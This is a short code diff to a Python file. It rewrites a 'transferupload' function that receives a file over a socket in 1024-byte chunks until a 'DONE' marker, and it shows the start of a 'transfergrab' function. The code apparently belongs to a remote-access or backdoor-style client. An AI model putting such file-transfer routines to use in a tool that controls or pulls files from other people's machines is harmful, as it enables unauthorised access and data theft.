@@ -44,19 +44,18 @@ def transferupload(s,command):
 	upload,path=command.split('*')
 	fpath=os.getcwd()+"/"
 	fpath += os.path.basename(path)
-	f=open(path,'wb+')
-	bits=s.recv(1024)
-	msg=bits.decode()
+	f=open(fpath,'w')
+	bits=s.recv(1024).decode()
 	while True:
 		f.write(bits)
-		bits=s.recv(1024)
-		msg=bits.decode()
-		if 'DONE' in msg:
+		bits=s.recv(1024).decode()
+		if bits.endswith("DONE"):
+			f.write(bits.strip("DONE"))
 			f.close()
 			break
-		bits=s.recv(1024)
 
- 
+
+
 def transfergrab(s,path):
 	if os.path.exists(path):
 		if os.path.isfile(path):
